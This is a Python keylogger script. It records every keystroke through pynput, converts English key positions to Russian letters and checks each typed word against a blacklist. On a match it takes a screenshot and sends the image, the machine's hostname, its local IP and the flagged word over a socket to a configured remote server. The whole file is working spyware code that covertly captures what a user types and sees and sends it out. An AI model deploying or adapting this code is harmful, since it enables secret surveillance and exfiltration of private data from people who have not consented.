from ast import While
from pynput.keyboard import Key, Listener
import logging
import server_config
import socket
import screenshot
import pickle

eng_to_rus = {
    'q':'й', 'w':'ц', 'e':'у', 'r':'к','t':'е',
    'y': 'н', 'u': 'г', 'i': 'ш', 'o': 'щ', 'p': 'з',
    '[': 'х', ']': 'ъ', 'a': 'ф', 's': 'ы', 'd': 'в',
    'f': 'а', 'g': 'п', 'h': 'р', 'j': 'о', 'k': 'л',
    'l': 'д', ';': 'ж', "'": 'э', 'z': 'я', 'x': 'ч',
    'c': 'с', 'v': 'м', 'b': 'и', 'n': 'т', 'm': 'ь',
    ',': 'б', '.': 'ю', '/': '.'
}

log_dir = ""
blacklist_file = 'blacklist.txt'
Checking_for_banword = 0

logging.basicConfig(filename=(log_dir + "keyLogger_3_log.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def get_pc_id():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return hostname, local_ip

def send_screenshot_to_server(filename):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_config.IP, server_config.PORT))


    file = open(f'{filename}', 'rb')

    image_data = file.read(2048)

    while image_data:
        client.send(image_data)
        image_data = file.read(2048)

    file.close()
    client.close()


def send_report_to_server(banword):
    filename, time = screenshot.capture_screen()

    hostname, local_ip = get_pc_id()

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_config.IP, server_config.PORT))
    data = [filename, time, hostname, local_ip, banword]
    data=pickle.dumps(data)
    client.sendall(data)

    client.close()

    send_screenshot_to_server(filename=filename)

def read_blacklist():
	print('[+] Reading blacklist')
	blk = []
	with open(f'{blacklist_file}', encoding='utf-8') as bl:
		bl = bl.readlines()
		for line in bl:
			blk.append(line.strip().lower())
			#print(line)
		global blacklist
		blacklist = blk
	print(f'Blacklist:\n{blacklist}')

def noty(word):
    print(f'Ban word detected: {word}')
    send_report_to_server(banword=word)

def compare_with_blacklist(word):
    print(f'[+] Checking @{word}@ for banword')
    
    if word in blacklist:
        print(f'Ban word detected: {word}')
        send_report_to_server(banword=word)
    else:
        print(f'{word} is clear')

class Keylogger:

    def __init__(self, keys):
        self.keys = keys

    def on_release(self, key):
        if key == Key.esc:
            return False

    def on_press(self, key):
        k = str(key).replace("'", "").lower()
        try:
            k = eng_to_rus[k]
        except:
            pass
        
        print(f"{k} pressed")
        
        if k.find("space") > 0 or k.find("enter") > 0:
            compare_with_blacklist(word = self.keys)
            self.keys = ''
            #logging.info("\n")
        elif k.find("Key") == -1:
            self.keys += k
            #logging.info(k)

def main():
    keys = ''
    
    read_blacklist()
    obj = Keylogger(keys)
    with Listener(on_press = obj.on_press, on_release = obj.on_release) as listener:
        listener.join()

def for_test():
    send_report_to_server(banword='sex')
    #send_screenshot_to_server('screenshots/2022-06-12 20-40-08.png')

if __name__ == '__main__':
    main()
    #for_test()